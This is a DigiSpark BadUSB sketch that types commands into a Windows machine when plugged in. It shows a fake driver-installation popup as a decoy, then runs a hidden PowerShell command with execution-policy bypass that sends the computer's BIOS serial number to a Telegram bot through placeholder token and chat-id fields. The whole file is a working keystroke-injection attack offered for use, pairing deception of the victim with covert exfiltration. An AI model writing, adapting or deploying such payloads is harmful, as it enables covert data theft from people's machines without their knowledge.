#include "DigiKeyboard.h"

void setup() {
    DigiKeyboard.delay(50);

    // Open Run dialog
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(150);

    // Display a fake message box
    DigiKeyboard.print(F("mshta vbscript:msgbox(\"New hardware detected! Installing necessary drivers... Please wait.\",64,\"Installation in Progress\")(window.close)"));
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(1000); // Short delay to ensure popup appears

    // Open Run dialog again while the popup is still visible
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(150);

    // Execute PowerShell payload (runs in the background)
    DigiKeyboard.print(F("powershell -ep bypass -w hidden -c \"iwr -Uri \\\"https://api.telegram.org/bot{Your API_TOKEN}/sendMessage?chat_id={Your chat_id}&text=$((gwmi Win32_BIOS).SerialNumber)\\\" -Method Get\""));
    
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {}
